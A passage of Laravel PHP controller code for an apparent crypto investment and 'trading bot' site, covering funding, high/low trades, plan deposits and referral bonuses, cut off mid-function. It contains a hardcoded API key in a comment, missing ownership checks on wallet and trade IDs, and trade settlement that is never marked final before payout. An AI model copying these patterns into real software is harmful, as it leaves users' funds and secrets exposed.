<?php

namespace App\Http\Controllers;

use App\AdminBalance;
use App\Announcement;
use App\BasicSetting;
use App\Charts\UserLineChart;
use App\CryptoWallet;
use App\Deposit;
use App\Fund;
use App\FundLog;
use App\GeneralSetting;
use App\Http\Controllers\Auth\RegisterController;
use App\LiveTrade;
use App\ManualBank;
use App\ManualFund;
use App\ManualFundLog;
use App\PassPhrase;
use App\Payment;
use App\PaymentWallet;
use App\Photo;
use App\Plan;
use App\RebeatLog;
use App\Reference;
use App\Repeat;
use App\Support;
use App\SupportMessage;
use App\TradeSetting;
use App\Traits\MailTrait;
use App\User;
use App\UserBalance;
use App\UserCompounding;
use App\UserReferral;
use App\UserWallet;
use App\Withdraw;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use Intervention\Image\Facades\Image;
use League\Flysystem\Exception;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\Mail;
use DB;
use Charts;

class UserController extends Controller
{
    use MailTrait;
    public function __construct()
    {
        $this->middleware('auth');
    }
    public function getDashboard()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "User Dashboard";
        $data['member'] = User::findOrFail(Auth::user()->id);
        $mem = User::findOrFail(Auth::user()->id);
        $data['last_deposit'] = Deposit::whereUser_id(Auth::user()->id)->orderBy('id','DESC')->take(9)->get();
        $data['current_deposit'] = Deposit::whereUser_id(Auth::user()->id)->whereStatus(0)->sum('amount');
        $data['fund'] = FundLog::whereUser_id(Auth::user()->id)->whereStatus(1)->sum('amount');
        $data['total_reference_user'] = User::whereUnder_reference($mem->reference)->count();
        $data['total_deposit'] = Deposit::whereUser_id(Auth::user()->id)->sum('amount');
        $data['total_deposit_time'] = Deposit::whereUser_id(Auth::user()->id)->count();
        $data['total_deposit_pending'] = Repeat::whereUser_id(Auth::user()->id)->whereStatus(0)->count();
        $data['total_deposit_complete'] = Repeat::whereUser_id(Auth::user()->id)->whereStatus(1)->count();
        $data['total_rebeat'] = RebeatLog::whereUser_id(Auth::user()->id)->sum('balance');
        $data['total_reference'] = Reference::whereUser_id(Auth::user()->id)->sum('balance');
        $data['num_ref'] = User::whereunder_reference(Auth::user()->reference)->count();
        $data['total_withdraw_time'] = Withdraw::whereUser_id(Auth::user()->id)->count();
        $data['total_withdraw_pending'] = Withdraw::whereUser_id(Auth::user()->id)->whereStatus(0)->count();
        $data['total_withdraw_complete'] = Withdraw::whereUser_id(Auth::user()->id)->whereStatus(1)->count();
        $data['total_withdraw_refund'] = Withdraw::whereUser_id(Auth::user()->id)->whereStatus(2)->count();
        $data['total_withdraw'] = Withdraw::whereUser_id(Auth::user()->id)->whereStatus(1)->sum('amount');
        $data['activity'] = UserBalance::whereUser_id(Auth::user()->id)->orderBy('id','desc')->take(4)->get();
        $data['planf'] = Plan::wherestatus(1)->whereplan_type_id(2)->get();
        $data['planfcount'] = Plan::wherestatus(1)->whereplan_type_id(2)->count();
        return view('user.dashboard',$data);
    }

    public function getDetails()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "User Dashboard";
        $data['member'] = User::findOrFail(Auth::user()->id);
        $mem = User::findOrFail(Auth::user()->id);
        $data['last_deposit'] = Deposit::whereUser_id(Auth::user()->id)->orderBy('id','DESC')->take(9)->get();
        $data['total_reference_user'] = User::whereUnder_reference($mem->reference)->count();
        $data['total_deposit'] = Deposit::whereUser_id(Auth::user()->id)->sum('amount');
        /*$data['total_deposit1'] = Deposit::whereUser_id(Auth::user()->id)->sum('amount');
        $data['total_deposit2'] = ManualFund::whereUser_id(Auth::user()->id)->sum('amount');*/
        $data['total_deposit_time'] = Deposit::whereUser_id(Auth::user()->id)->count();
        $data['total_deposit_pending'] = Repeat::whereUser_id(Auth::user()->id)->whereStatus(0)->count();
        $data['total_deposit_complete'] = Repeat::whereUser_id(Auth::user()->id)->whereStatus(1)->count();
        $data['total_rebeat'] = RebeatLog::whereUser_id(Auth::user()->id)->sum('balance');
        $data['total_reference'] = Reference::whereUser_id(Auth::user()->id)->sum('balance');
        $data['total_withdraw_time'] = Withdraw::whereUser_id(Auth::user()->id)->count();
        $data['total_withdraw_pending'] = Withdraw::whereUser_id(Auth::user()->id)->whereStatus(0)->count();
        $data['total_withdraw_complete'] = Withdraw::whereUser_id(Auth::user()->id)->whereStatus(1)->count();
        $data['total_withdraw_refund'] = Withdraw::whereUser_id(Auth::user()->id)->whereStatus(2)->count();
        $data['total_withdraw'] = Withdraw::whereUser_id(Auth::user()->id)->whereStatus(1)->sum('amount');
        return view('user.details',$data);
    }

    public function addFund()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Fund Wallet";
        $data['payment'] = Payment::first();
        $data['wallets'] = PaymentWallet::wherestatus(1)->get();
        return view('user.fund-add',$data);
    }

    public function storeFund(Request $request)
    {
        $this->validate($request,[
            'amount' => 'required',
            'payment_type' => 'required',
            'rate' => 'required'
        ]);
        $fu = $request->except('_method','_token');
        $fu['transaction_id'] = date('ymd').Str::random(6).rand(11,99);
        $fu['user_id'] = Auth::user()->id;

        $fund = FundLog::create($fu);
        $datas['general'] = GeneralSetting::first();
        $datas['site_title'] = $datas['general']->title;
        $datas['basic'] = BasicSetting::first();
        $datas['page_title'] = "Fund Preview";
        $datas['payment'] = PaymentWallet::findorfail($fund->payment_type);
        $datas['fund'] = $fund;

        $data = $this->btcPreview($datas);
        return view('user.btc-send',$data);
//        return redirect('btc-preview',$data);
    }

    public function btcPreview($datas)
    {
        $charge = $datas['payment']->fix + (($datas['fund']->amount * $datas['payment']->percent) / 100);
        $total = ($charge + $datas['fund']->amount) / $datas['payment']->rate;
        $data['amount'] = $total;
        $data['charge'] = $charge;
        $data['transaction_id'] = $datas['fund']->transaction_id;
        $tran = FundLog::whereTransaction_id($data['transaction_id'])->first();
        $pay = PaymentWallet::findorfail($tran->payment_type);
        if ($tran->crypto_wallet == null)
        {
            $sendto = $pay->wallet_1;
//            dd($sendto);

            if ($sendto!="") {
//                $api = "https://blockchain.info/tobtc?currency=USD&value=".$data['amount'];
                // $api = file_get_contents("http://api.coinlayer.com/api/live?access_key=1175cce0f6f3a0bdd83b30f677934207&symbols=ETH");

//                $walname = strtolower($pay->name);
//                $walname = Str::slug($walname);
//                $api = file_get_contents("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids={$walname}");
//                $response = json_decode($api);
//                $rate = $response[0]->current_price;
//                $calc = $data['amount'] / $rate;
                $calc = $data['amount'] / $pay->crypto_rate;
                $calc = round($calc, 6);
                $crypto = $calc;
                $tran->crypto_amount = $crypto;
                $tran->usd_amount = $data['amount'];
                $tran->crypto_wallet = $sendto;
                $tran->save();
            }else{
                session()->flash('message', "SOME ERRORS OCCURRED");
                Session::flash('type', 'warning');
                return redirect()->back();
            }
        }
        else
        {
            $crypto = $tran->crypto_amount;
            $sendto = $tran->crypto_wallet;
        }
        $var = "$sendto";
        $data['code'] =  "<img src=\"https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=$var&choe=UTF-8\" title='' style='width:300px;' />";
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = $pay->short." Send Preview";
        $data['payment_type'] = $tran->payment_type;
        $data['payment'] = $pay;
        $data['btc'] = $crypto;
        $data['add'] = $sendto;
        $data['fund'] = $tran;
        $this->sendFundingEmail($tran->transaction_id);
        return $data;

    }

    public function historyFund()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['page_title'] = "Funding History";
        $user_id = Auth::user()->id;
        $data['fund'] = FundLog::whereUser_id($user_id)->wherestatus(1)->orderBy('id','DESC')->get();
        $data['payment'] = Payment::first();
        $data['basic'] = BasicSetting::first();
        return view('user.fund-history',$data);
    }

    public function selectTrade()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Select Trading Wallet";
        $data['wallets'] = UserWallet::whereuser_id(Auth::user()->id)->wherestatus(1)->get();
        return view('user.trade',$data);
    }

    public function startTrade()
    {
        $payment = $_GET['payment_type'];
        $type = $_GET['trading_type'];
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['user_wallet'] = UserWallet::findorfail($payment);
        $data['wallet'] = PaymentWallet::findorfail($data['user_wallet']->wallet_id);

        if($type == 'bot')
        {
            $data['page_title'] = "Select Crypto Bot";
            $data['plan'] = Plan::whereStatus(1)->whereplan_type_id(1)->get();
            $data['type'] = 'Crypto';
            return view('user.deposit-new',$data);
        }elseif ($type == 'self')
        {
            $data['page_title'] = "Live Trade";
            $data['times'] = TradeSetting::all();
            $data['type'] = 'Live';
            return view('user.start-trade',$data);
        }elseif($type == 'forex')
        {
            if($data['user_wallet']->wallet_short == 'USDT')
            {
                $data['page_title'] = "Select Forex Bot";
                $data['plan'] = Plan::whereStatus(1)->whereplan_type_id(2)->get();
                $data['type'] = 'Forex';
                return view('user.deposit-new',$data);
            }else{
                session()->flash('message', 'Unable to Invest, Please fund your USDT wallet and continue!');
                Session::flash('type', 'danger');
                Session::flash('title', 'danger');
                return back();
            }

        }
    }

    public function placeTrade(Request $request)
    {
        $this->validate($request,[
            'amount' => 'required',
            'coinId' => 'required'
        ]);
        DB::beginTransaction();
        try
        {
            $user = User::findOrFail(Auth::user()->id);
            $data['user_wallet'] = UserWallet::findorfail($request->coinId);
            $data['wallet'] = PaymentWallet::findorfail($data['user_wallet']->wallet_id);

            $us['user_id'] = $user->id;
            $us['balance_type'] = 10;
            $us['balance'] = $request->amount;
            $us['old_balance'] = $user->amount;

//            $walname = strtolower($data['wallet']->name);
//            $api = @file_get_contents("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids={$walname}");
//            $response = json_decode($api);
//            $rate = $response[0]->current_price;
            $rate = $data['wallet']->crypto_rate;

            $data['user_wallet']->amount_in_usd = $data['user_wallet']->amount_in_usd - $request->amount;
            if($data['user_wallet']->amount_in_usd < 0)
            {
                session()->flash('message', 'Error Occurred. Check balance and Try again');
                Session::flash('type', 'danger');
                Session::flash('title', 'oops!');
                return back();
            }
            $user->amount = $user->amount - $request->amount;
            if($user->amount < 0)
            {
                session()->flash('message', 'Error Occurred. Check balance and Try again');
                Session::flash('type', 'danger');
                Session::flash('title', 'danger');
                return back();
            }

            $calc = $request->amount / $rate;
            $calc = round($calc, 6);
            $crypto = $calc;
            $data['user_wallet']->amount_in_crypto = $crypto;

            $trading = new LiveTrade();
            $trading->user_id = Auth::user()->id;
            $trading->wallet_id = $request->coinId;
            $trading->currency = $data['wallet']->name;
            $trading->symbol = $data['wallet']->short;
            $trading->amount = $request->amount;
            $trading->in_time = Carbon::now();
            $trading->in_amount = round($rate,2);
            $trading->high_low = $request->highlowType;
            $trading->result = "Pending";
            $trading->save();

            $data['user_wallet']->update();

            $us['new_balance'] = $user->amount;
            $us['details'] = "Trade ID: # ".$trading['id'].'; '."Live Trade : ".$data['wallet']->name;
            UserBalance::create($us);

            $user->update();

            $data['tradeLogId'] = $trading->id;
            $data['trade'] = $rate;

            DB::commit();
            return response()->json ([
                'status' => '200',
                'data' => $data,
            ]);
        }catch (\Exception $e)
        {
            DB::rollback();
            throw $e;
        }

    }

    public function tradeResult(Request $request)
    {
        $this->validate($request,[
            'tradeLogId' => 'required',
        ]);
        $trade = LiveTrade::findorfail($request->tradeLogId);
        $walname = strtolower(Str::slug($trade->currency));
        $api = @file_get_contents("https://api.coingecko.com/api/v3/simple/price?ids={$walname}&vs_currencies=usd");
        $response = json_decode($api);
        $rate = $response->$walname->usd;

        if((($rate > $trade->in_amount) && ($trade->high_low == 1)) || (($rate < $trade->in_amount) && ($trade->high_low == 2)))
        {
            if($trade->high_low == 1)
            {
                $diff = ($rate - $trade->in_amount) / 100;
            }else
            {
                $diff = ($trade->in_amount - $rate) / 100;
            }
//            $diff = ($rate - $trade->in_amount) / 100;
            $profit = $diff * $trade->amount;
            $final = $profit + $trade->amount;

            $wallet = UserWallet::findorfail($trade->wallet_id);
            $wallet->amount_in_usd = $final + $wallet->amount_in_usd;
            $wallet->amount_in_crypto = round($wallet->amount_in_usd/$rate,6);
            $wallet->update();

            $user = User::findorfail(Auth::user()->id);
            $user->amount = $user->amount + $final;
            $user->update();

            $trade->result = 'Win';
            $trade->status = 1;
            $trade->update();

            $value = 1;
        }
        elseif($rate == $trade->in_amount)
        {
            $wallet = UserWallet::findorfail($trade->wallet_id);
            $wallet->amount_in_usd = $trade->amount + $wallet->amount_in_usd;
            $wallet->amount_in_crypto = round($wallet->amount_in_usd/$rate,6);
            $wallet->update();

            $user = User::findorfail(Auth::user()->id);
            $user->amount = $user->amount + $trade->amount;
            $user->update();

            $trade->result = 'Draw';
            $trade->status = 1;
            $trade->update();

            $value = 3;
        }else{
            $trade->result = 'Lose';
            $trade->status = 1;
            $trade->update();

            $value = 2;
        }
        return response()->json ([
            'status' => '200',
            'data' => $value,
        ]);
    }

    public function newDeposit()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Deposit";
        $data['payment'] = Payment::first();
        $data['plan'] = Plan::whereStatus(1)->get();
        return view('user.deposit-new',$data);
    }

    public function postDeposit(Request $request)
    {
        $this->validate($request,[
            'id' => 'required'
        ]);
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "User Invest Preview";
        $data['payment'] = Payment::first();
        $data['plan'] = Plan::findOrFail($request->id);
        $data['wallets'] = UserWallet::whereuser_id(Auth::user()->id)->where('amount_in_usd', '>', 0)->wherestatus(1)->get();
        return view('user.deposit-preview',$data);

    }

    public function amountDeposit()
    {
        $plan = $_GET['plan'];
        $walletid = $_GET['wallet'];
        $plan = Plan::findOrFail($plan);
        $user = User::findOrFail(Auth::user()->id);
        $wallet = UserWallet::findorfail($walletid);
        $amount = $_GET['amount'];

        if ($amount > $wallet->amount_in_usd)
        {
            return response()->json ([
                'status' => '300',
                'data' => 'Amount Is Larger than Your Current Wallet Balance.',
            ]);
        }
        if( $plan->minimum > $amount)
        {
            return response()->json ([
                'status' => '300',
                'data' => 'Amount Is Smaller than Plan Minimum Amount.',
            ]);
        }
        elseif( $plan->maximum < $amount)
        {
            return response()->json ([
                'status' => '300',
                'data' => 'Amount Is Larger than Plan Maximum Amount.',
            ]);
        }
        else
        {
            return response()->json ([
                'status' => '200',
                'data' => 'Well Done. Proceed with Trade.',
            ]);
        }

    }

    public function depositSubmit(Request $request)
    {
        $this->validate($request,[
            'id' => 'required',
            'plan_id' => 'required',
            'wallet_id' => 'required'
        ]);
//        $c = UserCompounding::whereuser_id(Auth::user()->id)->whereactive(1)->first();
//        if(!$c)
//        {
        DB::beginTransaction();
        try
        {
            $plan = Plan::findOrFail($request->plan_id);
            $user = User::findOrFail(Auth::user()->id);
            $wallet = UserWallet::findorfail($request->wallet_id);
            $basic = BasicSetting::first();

            $dep['amount'] = $request->id;
            $dep['percent'] = $plan->percent;
            $dep['time'] = $plan->time;
            $dep['compound_id'] = $plan->compound_id;
            $dep['user_id'] = $user->id;
            $dep['plan_id'] = $plan->id;
            $dep['status'] = 0;
            $dep['deposit_number'] = date('ymd').Str::random(6).rand(11,99);
            $dep['wallet_id'] = $wallet->id;

            $us['user_id'] = $user->id;
            $us['balance_type'] = 2;
            $us['balance'] = $request->id;
            $us['old_balance'] = $user->amount;

            $user->amount = $user->amount - $request->id;
            if($user->amount < 0)
            {
                session()->flash('message', 'Error Occurred. Check balance and Try again');
                Session::flash('type', 'danger');
                Session::flash('title', 'danger');
                return back();
            }
            $us['new_balance'] = $user->amount;

            $wallet->amount_in_usd = $wallet->amount_in_usd - $request->id;

            if($wallet->amount_in_usd < 0)
            {
                session()->flash('message', 'Error Occurred. Check balance and Try again');
                Session::flash('type', 'error');
                Session::flash('title', 'error');
                return back();
            }

//            $walname = strtolower(Str::slug($wallet->wallets->name));
//            $api = file_get_contents("http://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids={$walname}");
//            $response = json_decode($api);
//            $rate = $response[0]->current_price;
            $rate = $wallet->wallets->crypto_rate;

            $calc = $wallet->amount_in_usd / $rate;
            $calc = round($calc, 6);

            $wallet->amount_in_crypto = $calc;
            $wallet->update();

            $user->save();

            $deposit = Deposit::create($dep);

            $us['details'] = "Trade ID: # ".$dep['deposit_number'].'; '."Trading Bot : ".$plan->name;
            UserBalance::create($us);
            $rr['user_id'] = $user->id;
            $rr['deposit_id'] = $deposit->id;
            $rr['wallet_id'] = $wallet->id;
            $rr['repeat_time'] = Carbon::parse()->addHours($plan->compound->compound);
            $refer = Auth::user()->under_reference;

            if($basic->reference_id == $refer)
            {
                $ref['user_id'] = 0;
                $ref['reference_id'] = $basic->reference_id;
                $ref['under_reference'] = $user->reference;
                $ref['balance'] = ( $request->id * $basic->reference ) / 100;
                $ref['details'] = "Referral Invest Bonus : ".$ref['balance']."; ".$basic->currency.' Referral ID : # '.$ref['under_reference'];
                $ref['old_balance'] = $basic->admin_total;
                $ref['new_balance'] = $basic->admin_total;
                Reference::create($ref);

                //admin reference Log
                $ad['user_id'] = 0;
                $ad['balance_type'] = 5;
                $ad['balance'] = $ref['balance'];
                $ad['old_balance'] = $ref['old_balance'];
                $ad['new_balance'] = $ref['old_balance'];
                $ad['details'] = $ref['details'];
                $ad['charge'] = "Default";
                AdminBalance::create($ad);

                //admin balance log

                $ad['user_id'] = Auth::user()->id;
                $ad['balance_type'] = 2;
                $ad['balance'] = $request->id;
                $ad['old_balance'] = $basic->admin_total;
                $ad['new_balance'] = $basic->admin_total + $request->id;
                $ad['details'] = "Invest ID: # ".$dep['deposit_number'].'; '."Invest Plan : ".$plan->name;
                AdminBalance::create($ad);
                // $basic->admin_total = $ad['new_balance'];
                $basic->save();

            }
            else
            {
                /* ---------- Reference Log ---------*/
                $rrrr = User::whereReference(Auth::user()->under_reference)->first();
                $ref['user_id'] = $rrrr->id;
                $ref['reference_id'] = $rrrr->reference;
                $ref['under_reference'] = $user->reference;
                $ref['balance'] = ( $request->id * $basic->reference ) / 100;
                $ref['details'] = "Referral Invest Bonus : ".$ref['balance']."-".$basic->currency."; ".' Referral ID : # '.$ref['under_reference'];
                $ref['old_balance'] = $rrrr->amount;
                $ref['new_balance'] = $rrrr->amount + $ref['balance'];
                Reference::create($ref);

                /*---- User reference Log ----*/
                $ad1['user_id'] = $rrrr->id;
                $ad1['balance_type'] = 5;
                $ad1['balance'] = $ref['balance'];
                $ad1['old_balance'] = $rrrr->amount;
                $ad1['new_balance'] = $rrrr->amount + $ad1['balance'];
                $ad1['details'] = $ref['details'];
                UserBalance::create($ad1);

                $rrrr->amount = $ref['new_balance'];
                $rrrr->save();

                /* ------ Admin reference Log -------*/
                $ad['user_id'] = $rrrr->id;
                $ad['balance_type'] = 5;
                $ad['balance'] = $ref['balance'];
                $ad['old_balance'] = $basic->admin_total;
                $ad['new_balance'] = $basic->admin_total - $ad['balance'];
                $ad['details'] = $ref['details'];
                AdminBalance::create($ad);
                $basic->admin_total = $ad['new_balance'];
                $basic->save();

                $ad1['user_id'] = Auth::user()->id;
                $ad1['balance_type'] = 2;
                $ad1['balance'] = $request->id;
                $ad1['old_balance'] = $basic->admin_total;
                $ad1['new_balance'] = $basic->admin_total + $request->id;
                $ad1['details'] = "Invest ID: # ".$dep['deposit_number'].'; '."Invest Plan : ".$plan->name;
                AdminBalance::create($ad1);
                // $basic->admin_total = $ad1['new_balance'];
                $basic->save();

                $gene = GeneralSetting::first();
                $b = BasicSetting::first();
                $usname = Auth::user()->name;
                $mail_val2 = [
                    'g_email' => $gene->email,
                    'g_title' => 'Referral Invest Notification',
                    'subject' => 'Referee Notification',
                    'receiver' => $rrrr->email,
                ];
                Config::set('mail.driver','mail');
                Config::set('mail.from',$gene->email);
                Config::set('mail.name','Referral Invest Notification');
                Mail::send('emails.referral', ['name' => $rrrr->name, 'rename' => $usname, 'email' => $rrrr->email, 'amount' => $request->id, 'percent' => $b->reference_bonus, 'site_title'=>$gene->title,'site_footer'=>$gene->title], function ($m) use ($mail_val2) {
                    $m->from($mail_val2['g_email'], $mail_val2['g_title']);
                    $m->to($mail_val2['receiver'])->subject($mail_val2['subject']);
                });
            }
            Repeat::create($rr);

            DB::commit();

            session()->flash('message', 'Bot Trading Started Successfully.');
            Session::flash('type', 'success');
            Session::flash('title', 'success');
            return redirect()->route('deposit-history');
        }catch (\Exception $e)
        {
            DB::rollback();
            throw $e;
        }
//        }else{
//            session()->flash('message', 'Trading Inactive!!.. Please contact support if you want to proceed.');
//            Session::flash('type', 'warning');
//            Session::flash('title', 'Opps.!');
//            return redirect()->back();
//        }

    }

    public function depositHistory()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "Trading History";
        $data['deposit'] = Deposit::whereUser_id(Auth::user()->id)->orderBy('id','DESC')->get();
        $data['live'] = LiveTrade::whereuser_id(Auth::user()->id)->orderBy('id','Desc')->get();
        return view('user.deposit-history',$data);
    }

    public function repeatHistory()
    {
        $data['general'] = GeneralSetting::first();
        $data['site_title'] = $data['general']->title;
        $data['basic'] = BasicSetting::first();
        $data['page_title'] = "User Profit History";
        $data['deposit'] = Deposit::whereUser_id(Auth::user()->id)->orderBy('id','DESC')->paginate(9);
        return view('user.repeat-history',$data);
    }

    public function paypalCheck(Request $request)
    {
        $amount = $request->amount;
        $type = $request->payment_type;
        $basic = Payment::first();
        if ($type == 1)
        {

            if(($amount) < $basic->paypal_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->paypal_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Add Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }elseif($type == 2){
            if(($amount) < $basic->perfect_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->perfect_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Deposit Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }elseif($type == 3){
            if(($amount) < $basic->btc_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->btc_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }elseif($type == 4){
            if(($amount) < $basic->stripe_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->stripe_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }
        elseif($type == 5){
            if(($amount) < $basic->btcash_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Smaller than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }elseif(($amount) > $basic->btcash_max)
            {
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-warning"><i class="fa fa-times"></i> Amount Is Larger than Funding Minimum Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="button" class="btn btn-info disabled"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }else{
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
                    <div class="alert alert-success"><i class="fa fa-check"></i> Well Done. Fund This Amount.</div>
                </div>
                <div class="col-md-12 col-sm-offset-2" style="text-align: right;margin-top: 10px;">
                    <button type="button" class="btn btn-default" data-dismiss="modal"><i class="fa fa-times"></i> Close</button>
                    <button type="submit" class="btn btn-info"><i class="fa fa-send"></i> Deposit Fund</button>
                </div>';
            }
        }
        elseif($type == 6){
            if(($amount) < $basic->eth_min){
                return '<div class="col-md-12 col-sm-offset-2" style="margin-bottom: -15px;">
